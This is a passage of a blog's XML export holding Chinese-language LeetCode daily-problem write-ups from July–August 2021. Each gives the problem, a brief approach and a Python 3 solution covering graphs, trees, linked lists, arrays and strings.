    <content type="text"><![CDATA[题目：581. 最短无序连续子数组难度：中等 给你一个整数数组 nums ，你需要找出一个 连续子数组 ，如果对这个子数组进行升序排序，那么整个数组都会变为升序排序。 请你找出符合题意的 最短 子数组，并输出它的长度。 示例 1： 123输入：nums = [2,6,4,8,10,9,15]输出：5解释：你只需要对 [6, 4, 8, 10, 9] 进行升序排序，那么整个表都会变为升序排序。 示例 2： 12输入：nums = [1,2,3,4]输出：0 示例 3： 12输入：nums = [1]输出：0 提示： 1 &lt;= nums.length &lt;= 104 -105 &lt;= nums[i] &lt;= 105 进阶： 你可以设计一个时间复杂度为 O(n) 的解决方案吗？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/shortest-unsorted-continuous-subarray/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 排序后对比一下两个数组就知道了 解题代码1234567891011121314class Solution: def findUnsortedSubarray(self, nums: List[int]) -&gt; int: nums2 = sorted(nums) l = 0 r = len(nums) - 1 while l &lt; len(nums): if nums[l] != nums2[l]: break l += 1 while r &gt; l: if nums[r] != nums2[r]: break r -= 1 return r - l + 1]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>排序</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/8/2]]></title>
    <url>%2Fposts%2Fbb6e909%2F</url>
    <content type="text"><![CDATA[题目：743. 网络延迟时间难度：中等 有 n 个网络节点，标记为 1 到 n。 给你一个列表 times，表示信号经过 有向 边的传递时间。 times[i] = (ui, vi, wi)，其中 ui 是源节点，vi 是目标节点， wi 是一个信号从源节点传递到目标节点的时间。 现在，从某个节点 K 发出一个信号。需要多久才能使所有节点都收到信号？如果不能使所有节点收到信号，返回 -1 。 示例 1： 12输入：times = [[2,1,1],[2,3,1],[3,4,1]], n = 4, k = 2输出：2 示例 2： 12输入：times = [[1,2,1]], n = 2, k = 1输出：1 示例 3： 12输入：times = [[1,2,1]], n = 2, k = 2输出：-1 提示： 1 &lt;= k &lt;= n &lt;= 100 1 &lt;= times.length &lt;= 6000 times[i].length == 3 1 &lt;= ui, vi &lt;= n ui != vi 0 &lt;= wi &lt;= 100 所有 (ui, vi) 对都 互不相同（即，不含重复边） 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/network-delay-time/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 dijkstra求最短路裸题 解题代码1234567891011121314151617181920212223242526272829303132333435363738class Solution: def networkDelayTime(self, times: List[List[int]], n: int, k: int) -&gt; int: # 建图 g = defaultdict(list) for x in times: g[x[0]].append((x[1],x[2])) # dijkstra s = k vis = defaultdict(bool) d = defaultdict(int) inf = maxsize for i in range(1,n + 1): d[i] = inf for x in g[s]: d[x[0]] = x[1] d[s] = 0 vis[s] = True cnt = 0 while cnt &lt; n: _min = inf idx = 0 for i in range(1,n + 1): if vis[i]: continue if _min &gt; d[i]: _min = d[i] idx = i vis[idx] = True cnt += 1 for x in g[idx]: if d[x[0]] &gt; d[idx] + x[1]: d[x[0]] = d[idx] + x[1] ans = max(d.values()) return ans if ans != maxsize else -1]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>python3</tag>
        <tag>dijkstra</tag>
        <tag>最短路</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/8/1]]></title>
    <url>%2Fposts%2F92bfb8b3%2F</url>
    <content type="text"><![CDATA[题目：1337. 矩阵中战斗力最弱的 K 行难度：简单 给你一个大小为 m * n 的矩阵 mat，矩阵由若干军人和平民组成，分别用 1 和 0 表示。 请你返回矩阵中战斗力最弱的 k 行的索引，按从最弱到最强排序。 如果第 i 行的军人数量少于第 j 行，或者两行军人数量相同但i 小于 j，那么我们认为第 i行的战斗力比第j行弱。 军人 总是 排在一行中的靠前位置，也就是说 1 总是出现在 0 之前。 示例 1： 12345678910111213141516输入：mat = [[1,1,0,0,0], [1,1,1,1,0], [1,0,0,0,0], [1,1,0,0,0], [1,1,1,1,1]], k = 3输出：[2,0,3]解释：每行中的军人数目：行 0 -&gt; 2 行 1 -&gt; 4 行 2 -&gt; 1 行 3 -&gt; 2 行 4 -&gt; 5 从最弱到最强对这些行排序后得到 [2,0,3,1,4] 示例 2： 1234567891011121314输入：mat = [[1,0,0,0], [1,1,1,1], [1,0,0,0], [1,0,0,0]], k = 2输出：[0,2]解释： 每行中的军人数目：行 0 -&gt; 1 行 1 -&gt; 4 行 2 -&gt; 1 行 3 -&gt; 1 从最弱到最强对这些行排序后得到 [0,2,3,1] 提示： m == mat.length n == mat[i].length 2 &lt;= n, m &lt;= 100 1 &lt;= k &lt;= m matrix[i][j] 不是 0 就是 1 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/the-k-weakest-rows-in-a-matrix/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 自定义排序 解题代码1234567891011121314151617181920class Solution: def kWeakestRows(self, mat: List[List[int]], k: int) -&gt; List[int]: arr = [] idx = 0 for r in mat: cnt = 0 for j in r: if j: cnt += 1 else: break arr.append((idx,cnt)) idx += 1 def cmp(a,b): if a[1] == b[1]: return a[0] - b[0] return a[1] - b[1] arr = sorted(arr,key=functools.cmp_to_key(cmp)) ans = [i[0] for i in arr] return ans[0:k]]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/31]]></title>
    <url>%2Fposts%2Fbb73c0ed%2F</url>
    <content type="text"><![CDATA[题目：987. 二叉树的垂序遍历难度：困难 给你二叉树的根结点 root ，请你设计算法计算二叉树的 垂序遍历 序列。 对位于 (row, col) 的每个结点而言，其左右子结点分别位于 (row + 1, col - 1) 和 (row + 1, col + 1) 。树的根结点位于 (0, 0) 。 二叉树的 垂序遍历 从最左边的列开始直到最右边的列结束，按列索引每一列上的所有结点，形成一个按出现位置从上到下排序的有序列表。如果同行同列上有多个结点，则按结点的值从小到大进行排序。 返回二叉树的 垂序遍历 序列。 示例 1： 1234567输入：root = [3,9,20,null,null,15,7]输出：[[9],[3,15],[20],[7]]解释：列 -1 ：只有结点 9 在此列中。列 0 ：只有结点 3 和 15 在此列中，按从上到下顺序。列 1 ：只有结点 20 在此列中。列 2 ：只有结点 7 在此列中。 示例 2： 12345678910输入：root = [1,2,3,4,5,6,7]输出：[[4],[2],[1,5,6],[3],[7]]解释：列 -2 ：只有结点 4 在此列中。列 -1 ：只有结点 2 在此列中。列 0 ：结点 1 、5 和 6 都在此列中。 1 在上面，所以它出现在前面。 5 和 6 位置都是 (2, 0) ，所以按值从小到大排序，5 在 6 的前面。列 1 ：只有结点 3 在此列中。列 2 ：只有结点 7 在此列中。 示例 3： 12345输入：root = [1,2,3,4,6,5,7]输出：[[4],[2],[1,5,6],[3],[7]]解释：这个示例实际上与示例 2 完全相同，只是结点 5 和 6 在树中的位置发生了交换。因为 5 和 6 的位置仍然相同，所以答案保持不变，仍然按值从小到大排序。 提示： 树中结点数目总数在范围 [1, 1000] 内 0 &lt;= Node.val &lt;= 1000 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/vertical-order-traversal-of-a-binary-tree/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 先遍历一遍树，将结果存在哈希表中，然后构建ans即可 解题代码12345678910111213141516171819202122232425262728293031323334353637383940# Definition for a binary tree node.# class TreeNode:# def __init__(self, val=0, left=None, right=None):# self.val = val# self.left = left# self.right = rightclass Solution: def verticalTraversal(self, root: TreeNode) -&gt; List[List[int]]: d = defaultdict(list) _minY = 1000 _maxY = -1000 _maxX = -1000 def dfs(root,x,y): nonlocal _minY,_maxY,_maxX,d if root: if y &lt; _minY: _minY = y if y &gt; _maxY: _maxY = y if x &gt; _maxX: _maxX = x d['%d,%d' % (x,y)].append(root.val) d['%d,%d' % (x,y)].sort() if root.left: dfs(root.left,x + 1,y - 1) if root.right: dfs(root.right,x + 1,y + 1) dfs(root,0,0) ans = [[]] idx = 0 for y in range(_minY,_maxY + 1): for x in range(_maxX + 1): if d.get('%d,%d' % (x,y)): if idx &gt;= len(ans): ans.append([]) ans[idx].extend(d.get('%d,%d' % (x,y))) idx += 1 return ans]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/30]]></title>
    <url>%2Fposts%2Fcc74f07b%2F</url>
    <content type="text"><![CDATA[题目：171. Excel 表列序号难度：简单 给你一个字符串 columnTitle ，表示 Excel 表格中的列名称。返回该列名称对应的列序号。 例如， 12345678A -&gt; 1B -&gt; 2C -&gt; 3...Z -&gt; 26AA -&gt; 27AB -&gt; 28 ... 示例 1: 12输入: columnTitle = &quot;A&quot;输出: 1 示例 2: 12输入: columnTitle = &quot;AB&quot;输出: 28 示例 3: 12输入: columnTitle = &quot;ZY&quot;输出: 701 示例 4: 12输入: columnTitle = &quot;FXSHRXW&quot;输出: 2147483647 提示： 1 &lt;= columnTitle.length &lt;= 7 columnTitle 仅由大写英文组成 columnTitle 在范围 [“A”, “FXSHRXW”] 内 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/excel-sheet-column-number/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 没什么可说的，简单的进制转换 解题代码123456class Solution: def titleToNumber(self, columnTitle: str) -&gt; int: ans = 0 for i in columnTitle: ans = ans * 26 + (ord(i) - ord('A') + 1) return ans]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>数学</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/29]]></title>
    <url>%2Fposts%2Facb3799e%2F</url>
    <content type="text"><![CDATA[题目：1104. 二叉树寻路难度：中等 在一棵无限的二叉树上，每个节点都有两个子节点，树中的节点 逐行 依次按 “之” 字形进行标记。 如下图所示，在奇数行（即，第一行、第三行、第五行……）中，按从左到右的顺序进行标记； 而偶数行（即，第二行、第四行、第六行……）中，按从右到左的顺序进行标记。 给你树上某一个节点的标号 label，请你返回从根节点到该标号为 label 节点的路径，该路径是由途经的节点标号所组成的。 示例 1： 12输入：label = 14输出：[1,3,4,14] 示例 2： 12输入：label = 26输出：[1,2,6,10,26] 提示： 1 &lt;= label &lt;= 10^6 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/path-in-zigzag-labelled-binary-tree/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 按照正常情况来做，处理好偶行逆序即可 解题代码123456789101112131415161718192021222324252627282930class Solution: def pathInZigZagTree(self, label: int) -&gt; List[int]: ans = [] ans.append(label) r = self.row(label) while r &gt; 0: label = self.trans(r,label) f = self.trans(r - 1,label // 2) if f &lt; 1: break ans.append(f) label = f r -= 1 ans.reverse() return ans # 之字形label编号转换为正常的从左至右 def trans(self,r,l): m = 2 ** r - 1 if r % 2 == 0: n = 2 ** (r - 1) return n + m - l return l # 计算label在二叉树中哪一行 def row(self,label): i = 0 while label &gt; 0: t = 2 ** i label -= t i += 1 return i]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
        <tag>数学</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/28]]></title>
    <url>%2Fposts%2Fdbb44908%2F</url>
    <content type="text"><![CDATA[题目：863. 二叉树中所有距离为 K 的结点难度：中等 给定一个二叉树（具有根结点 root）， 一个目标结点 target ，和一个整数值 K 。 返回到目标结点 target 距离为 K 的所有结点的值的列表。 答案可以以任何顺序返回。 示例 1： 12345678910输入：root = [3,5,1,6,2,0,8,null,null,7,4], target = 5, K = 2输出：[7,4,1]解释：所求结点为与目标结点（值为 5）距离为 2 的结点，值分别为 7，4，以及 1注意，输入的 &quot;root&quot; 和 &quot;target&quot; 实际上是树上的结点。上面的输入仅仅是对这些对象进行了序列化描述。 提示： 给定的树是非空的。 树上的每个结点都具有唯一的值 0 &lt;= node.val &lt;= 500 。 目标结点 target 是树上的结点。 0 &lt;= K &lt;= 1000. 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/all-nodes-distance-k-in-binary-tree/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 建图，然后搜索 解题代码1234567891011121314151617181920212223242526272829303132333435363738# Definition for a binary tree node.# class TreeNode:# def __init__(self, x):# self.val = x# self.left = None# self.right = Noneclass Solution: def distanceK(self, root: TreeNode, target: TreeNode, k: int) -&gt; List[int]: # 第一次bfs建图 q = deque() d = defaultdict(list) q.append(root) while q: p = q.popleft() if p.left: d[p.val].append(p.left.val) d[p.left.val].append(p.val) q.append(p.left) if p.right: d[p.val].append(p.right.val) d[p.right.val].append(p.val) q.append(p.right) # 第二次bfs搜索结果 q.append((target.val,0)) vis = set() vis.add(target.val) ans = [] while q: v,s = q.popleft() if s == k: ans.append(v) for i in d[v]: if i not in vis: vis.add(i) q.append((i,s + 1)) return ans]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
        <tag>广度优先搜索</tag>
        <tag>bfs</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/27]]></title>
    <url>%2Fposts%2F4b0b5499%2F</url>
    <content type="text"><![CDATA[题目：671. 二叉树中第二小的节点难度：简单 给定一个非空特殊的二叉树，每个节点都是正数，并且每个节点的子节点数量只能为 2 或 0。如果一个节点有两个子节点的话，那么该节点的值等于两个子节点中较小的一个。 更正式地说，root.val = min(root.left.val, root.right.val) 总成立。 给出这样的一个二叉树，你需要输出所有节点中的 第二小的值。 如果第二小的值不存在的话，输出 -1。 示例 1： 123输入：root = [2,2,5,null,null,5,7]输出：5解释：最小的值是 2 ，第二小的值是 5 。 示例 2： 123输入：root = [2,2,2]输出：-1解释：最小的值是 2, 但是不存在第二小的值。 提示： 树中节点数目在范围 [1, 25] 内 1 &lt;= Node.val &lt;= 231 - 1 对于树中每个节点 root.val == min(root.left.val, root.right.val) 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/second-minimum-node-in-a-binary-tree/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 根据题目定义，二叉树根结点的值一定是该树的最小值，因此我们只需要遍历一遍树，找出第一个严格大于该值的值即为ans 解题代码123456789101112131415161718192021222324# Definition for a binary tree node.# class TreeNode:# def __init__(self, val=0, left=None, right=None):# self.val = val# self.left = left# self.right = rightclass Solution: def findSecondMinimumValue(self, root: TreeNode) -&gt; int: ans = -1 _min = root.val def dfs(root): nonlocal ans if not root: return if ans != -1 and root.val &gt;= ans: return if root.val &gt; _min: ans = root.val dfs(root.left) dfs(root.right) dfs(root) return ans]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/26]]></title>
    <url>%2Fposts%2F3c0c640f%2F</url>
    <content type="text"><![CDATA[题目：1713. 得到子序列的最少操作次数难度：困难 给你一个数组 target ，包含若干 互不相同 的整数，以及另一个整数数组 arr ，arr 可能 包含重复元素。 每一次操作中，你可以在 arr 的任意位置插入任一整数。比方说，如果 arr = [1,4,1,2] ，那么你可以在中间添加 3 得到 [1,4,3,1,2] 。你可以在数组最开始或最后面添加整数。 请你返回 最少 操作次数，使得 target 成为 arr 的一个子序列。 一个数组的 子序列 指的是删除原数组的某些元素（可能一个元素都不删除），同时不改变其余元素的相对顺序得到的数组。比方说，[2,7,4] 是 [4,2,3,7,2,1,4] 的子序列（加粗元素），但 [2,4,2] 不是子序列。 示例 1： 123输入：target = [5,1,3], arr = [9,4,2,3,4]输出：2解释：你可以添加 5 和 1 ，使得 arr 变为 [5,9,4,1,2,3,4] ，target 为 arr 的子序列。 示例 2： 12输入：target = [6,4,8,1,3,2], arr = [4,7,6,2,3,8,6,1]输出：3 提示： 1 &lt;= target.length, arr.length &lt;= 105 1 &lt;= target[i], arr[i] &lt;= 109 target 不包含任何重复元素。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/minimum-operations-to-make-a-subsequence/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 转换为求最大递增子序列长度问题 解题代码123456789101112131415161718192021222324252627282930313233class Solution: def minOperations(self, target: List[int], arr: List[int]) -&gt; int: n = len(target) d = &#123;&#125; idx = 0 for i in target: d[i] = idx idx += 1 # print(d) _arr = [] for i in arr: if i in d: _arr.append(d[i]) # print(_arr) return n - self.lengthOfLIS(_arr) def lengthOfLIS(self, nums: List[int]) -&gt; int: d = [] for n in nums: if not d or n &gt; d[-1]: d.append(n) else: l, r = 0, len(d) - 1 loc = r while l &lt;= r: mid = (l + r) // 2 if d[mid] &gt;= n: loc = mid r = mid - 1 else: l = mid + 1 d[loc] = n return len(d)]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>哈希表</tag>
        <tag>二分查找</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/25]]></title>
    <url>%2Fposts%2Fa50535b5%2F</url>
    <content type="text"><![CDATA[题目：1743. 从相邻元素对还原数组难度：中等 存在一个由 n 个不同元素组成的整数数组 nums ，但你已经记不清具体内容。好在你还记得 nums 中的每一对相邻元素。 给你一个二维整数数组 adjacentPairs ，大小为 n - 1 ，其中每个 adjacentPairs[i] = [ui, vi] 表示元素 ui 和 vi 在 nums 中相邻。 题目数据保证所有由元素 nums[i] 和 nums[i+1] 组成的相邻元素对都存在于 adjacentPairs 中，存在形式可能是 [nums[i], nums[i+1]] ，也可能是 [nums[i+1], nums[i]] 。这些相邻元素对可以 按任意顺序 出现。 返回 原始数组 nums 。如果存在多种解答，返回 其中任意一个 即可。 示例 1： 1234输入：adjacentPairs = [[2,1],[3,4],[3,2]]输出：[1,2,3,4]解释：数组的所有相邻元素对都在 adjacentPairs 中。特别要注意的是，adjacentPairs[i] 只表示两个元素相邻，并不保证其 左-右 顺序。 示例 2： 1234输入：adjacentPairs = [[4,-2],[1,4],[-3,1]]输出：[-2,4,1,-3]解释：数组中可能存在负数。另一种解答是 [-3,1,4,-2] ，也会被视作正确答案。 示例 3： 12输入：adjacentPairs = [[100000,-100000]]输出：[100000,-100000] 提示： nums.length == n adjacentPairs.length == n - 1 adjacentPairs[i].length == 2 2 &lt;= n &lt;= 105 -105 &lt;= nums[i], ui, vi &lt;= 105 题目数据保证存在一些以 adjacentPairs 作为元素对的数组 nums 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/restore-the-array-from-adjacent-pairs/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 建图，找到起点，然后深度优先遍历 解题代码123456789101112131415161718192021222324class Solution: def restoreArray(self, adjacentPairs: List[List[int]]) -&gt; List[int]: d = defaultdict(list) for x in adjacentPairs: d[x[0]].append(x[1]) d[x[1]].append(x[0]) # print(d) # print(v) ans = [] start = 10 ** 5 + 1 for i in d.keys(): if len(d[i]) == 1: start = i break vis = &#123;&#125; self.dfs(d,start,ans,vis) return ans def dfs(self,d,i,ans,vis): if i in vis: return vis[i] = True ans.append(i) for j in d[i]: self.dfs(d,j,ans,vis)]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>哈希表</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/24]]></title>
    <url>%2Fposts%2Fd2020523%2F</url>
    <content type="text"><![CDATA[题目：1736. 替换隐藏数字得到的最晚时间难度：简单 给你一个字符串 time ，格式为 hh:mm（小时：分钟），其中某几位数字被隐藏（用 ? 表示）。 有效的时间为 00:00 到 23:59 之间的所有时间，包括 00:00 和 23:59 。 替换 time 中隐藏的数字，返回你可以得到的最晚有效时间。 示例 1： 123输入：time = &quot;2?:?0&quot;输出：&quot;23:50&quot;解释：以数字 &apos;2&apos; 开头的最晚一小时是 23 ，以 &apos;0&apos; 结尾的最晚一分钟是 50 。 示例 2： 12输入：time = &quot;0?:3?&quot;输出：&quot;09:39&quot; 示例 3： 12输入：time = &quot;1?:22&quot;输出：&quot;19:22&quot; 提示： time 的格式为 hh:mm 题目数据保证你可以由输入的字符串生成有效的时间 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/latest-time-by-replacing-hidden-digits/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 贪心，优先更晚的时间去靠拢 解题代码123456789101112131415161718192021222324class Solution: def maximumTime(self, time: str) -&gt; str: t = list(time) if t[0] == '?' and t[1] == '?': t[0] = '2' t[1] = '3' elif t[0] == '?': if t[1] &gt; '3': t[0] = '1' else: t[0] = '2' elif t[1] == '?': if t[0] == '2': t[1] = '3' else: t[1] = '9' if t[3] == '?' and t[4] == '?': t[3] = '5' t[4] = '9' elif t[3] == '?': t[3] = '5' elif t[4] == '?': t[4] = '9' return ''.join(t)]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/23]]></title>
    <url>%2Fposts%2F4c669080%2F</url>
    <content type="text"><![CDATA[题目：1893. 检查是否区域内所有整数都被覆盖难度：简单 给你一个二维整数数组 ranges 和两个整数 left 和 right 。每个 ranges[i] = [starti, endi] 表示一个从 starti 到 endi 的 闭区间 。 如果闭区间 [left, right] 内每个整数都被 ranges 中 至少一个 区间覆盖，那么请你返回 true ，否则返回 false 。 已知区间 ranges[i] = [starti, endi] ，如果整数 x 满足 starti &lt;= x &lt;= endi ，那么我们称整数x 被覆盖了。 示例 1： 123456输入：ranges = [[1,2],[3,4],[5,6]], left = 2, right = 5输出：true解释：2 到 5 的每个整数都被覆盖了：- 2 被第一个区间覆盖。- 3 和 4 被第二个区间覆盖。- 5 被第三个区间覆盖。 示例 2： 123输入：ranges = [[1,10],[10,20]], left = 21, right = 21输出：false解释：21 没有被任何一个区间覆盖。 提示： 1 &lt;= ranges.length &lt;= 50 1 &lt;= starti &lt;= endi &lt;= 50 1 &lt;= left &lt;= right &lt;= 50 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/check-if-all-the-integers-in-a-range-are-covered/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 暴力 解题代码12345678910class Solution: def isCovered(self, ranges: List[List[int]], left: int, right: int) -&gt; bool: for i in range(left,right + 1): flag = True for x in ranges: if x[0] &lt;= i &lt;= x[1]: flag = False if flag: return False return True]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/22]]></title>
    <url>%2Fposts%2F3b61a016%2F</url>
    <content type="text"><![CDATA[题目：138. 复制带随机指针的链表难度：中等 给你一个长度为 n 的链表，每个节点包含一个额外增加的随机指针 random ，该指针可以指向链表中的任何节点或空节点。 构造这个链表的 深拷贝。 深拷贝应该正好由 n 个 全新 节点组成，其中每个新节点的值都设为其对应的原节点的值。新节点的 next 指针和 random 指针也都应指向复制链表中的新节点，并使原链表和复制链表中的这些指针能够表示相同的链表状态。*复制链表中的指针都不应指向原链表中的节点 *。 例如，如果原链表中有 X 和 Y 两个节点，其中 X.random –&gt; Y 。那么在复制链表中对应的两个节点 x 和 y ，同样有 x.random –&gt; y 。 返回复制链表的头节点。 用一个由 n 个节点组成的链表来表示输入/输出中的链表。每个节点用一个 [val, random_index] 表示： val：一个表示 Node.val 的整数。 random_index：随机指针指向的节点索引（范围从 0 到 n-1）；如果不指向任何节点，则为 null 。 你的代码 只 接受原链表的头节点 head 作为传入参数。 示例 1： 12输入：head = [[7,null],[13,0],[11,4],[10,2],[1,0]]输出：[[7,null],[13,0],[11,4],[10,2],[1,0]] 示例 2： 12输入：head = [[1,1],[2,1]]输出：[[1,1],[2,1]] 示例 3： 12输入：head = [[3,null],[3,0],[3,null]]输出：[[3,null],[3,0],[3,null]] 示例 4： 123输入：head = []输出：[]解释：给定的链表为空（空指针），因此返回 null。 提示： 0 &lt;= n &lt;= 1000 -10000 &lt;= Node.val &lt;= 10000 Node.random 为空（null）或指向链表中的节点。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/copy-list-with-random-pointer/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 先复制每个节点，然后构建指针 解题代码1234567891011121314151617181920212223"""# Definition for a Node.class Node: def __init__(self, x: int, next: 'Node' = None, random: 'Node' = None): self.val = int(x) self.next = next self.random = random"""class Solution: def copyRandomList(self, head: 'Node') -&gt; 'Node': if head: d = &#123;&#125; cur = head while cur: d[cur] = Node(cur.val) cur = cur.next cur = head while cur: d[cur].next = d.get(cur.next) d[cur].random = d.get(cur.random) cur = cur.next return d[head]]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>链表</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/21]]></title>
    <url>%2Fposts%2Fa268f1ac%2F</url>
    <content type="text"><![CDATA[题目：剑指 Offer 52. 两个链表的第一个公共节点难度：简单 输入两个链表，找出它们的第一个公共节点。 如下面的两个链表： 在节点 c1 开始相交。 示例 1： 123输入：intersectVal = 8, listA = [4,1,8,4,5], listB = [5,0,1,8,4,5], skipA = 2, skipB = 3输出：Reference of the node with value = 8输入解释：相交节点的值为 8 （注意，如果两个列表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [4,1,8,4,5]，链表 B 为 [5,0,1,8,4,5]。在 A 中，相交节点前有 2 个节点；在 B 中，相交节点前有 3 个节点。 示例 2： 123输入：intersectVal = 2, listA = [0,9,1,2,4], listB = [3,2,4], skipA = 3, skipB = 1输出：Reference of the node with value = 2输入解释：相交节点的值为 2 （注意，如果两个列表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [0,9,1,2,4]，链表 B 为 [3,2,4]。在 A 中，相交节点前有 3 个节点；在 B 中，相交节点前有 1 个节点。 示例 3： 1234输入：intersectVal = 0, listA = [2,6,4], listB = [1,5], skipA = 3, skipB = 2输出：null输入解释：从各自的表头开始算起，链表 A 为 [2,6,4]，链表 B 为 [1,5]。由于这两个链表不相交，所以 intersectVal 必须为 0，而 skipA 和 skipB 可以是任意值。解释：这两个链表不相交，因此返回 null。 注意： 如果两个链表没有交点，返回 null. 在返回结果后，两个链表仍须保持原有的结构。 可假定整个链表结构中没有循环。 程序尽量满足 O(n) 时间复杂度，且仅用 O(1) 内存。 本题与主站 160 题相同：https://leetcode-cn.com/problems/intersection-of-two-linked-lists/ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/liang-ge-lian-biao-de-di-yi-ge-gong-gong-jie-dian-lcof/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 先遍历A，哈希表存起来，然后遍历B，如果存在就返回，否则就不存在相交的节点 解题代码12345678910111213141516171819# Definition for singly-linked list.# class ListNode:# def __init__(self, x):# self.val = x# self.next = Noneclass Solution: def getIntersectionNode(self, headA: ListNode, headB: ListNode) -&gt; ListNode: s = set() cur = headA while cur: s.add(cur) cur = cur.next cur = headB while cur: if cur in s: return cur cur = cur.next return cur]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>链表</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/7/20]]></title>
    <url>%2Fposts%2Fd56fc13a%2F</url>
